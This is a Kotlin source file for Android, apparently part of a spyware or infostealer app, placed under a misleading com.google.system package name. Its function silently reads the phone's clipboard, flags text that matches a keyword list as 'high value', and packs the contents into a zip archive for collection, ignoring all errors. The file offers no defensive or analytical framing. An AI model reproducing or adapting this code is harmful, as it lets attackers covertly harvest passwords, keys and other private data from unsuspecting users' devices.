package com.google.system

import android.content.Context
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

internal fun scanClipboard(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
    try {
        val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val clip = cm.primaryClip
        if (clip != null && clip.itemCount > 0) {
            val text = clip.getItemAt(0).coerceToText(ctx).toString()
            if (text.isNotBlank()) {
                val matches = CLIPBOARD_KEYWORDS.filter { text.lowercase().contains(it) }
                val content = buildString {
                    appendLine("=== CLIPBOARD ===")
                    appendLine("Time: ${System.currentTimeMillis()}")
                    appendLine("Length: ${text.length}")
                    if (matches.isNotEmpty()) appendLine("ALERT: ${matches.joinToString(", ")}")
                    appendLine()
                    appendLine(text)
                }
                zos.putNextEntry(ZipEntry("clipboard/current.txt"))
                zos.write(content.toByteArray())
                zos.closeEntry()
                r.files++
                r.size += content.length
                if (matches.isNotEmpty()) r.highValue++
            }
        }
    } catch (_: Exception) {}
}
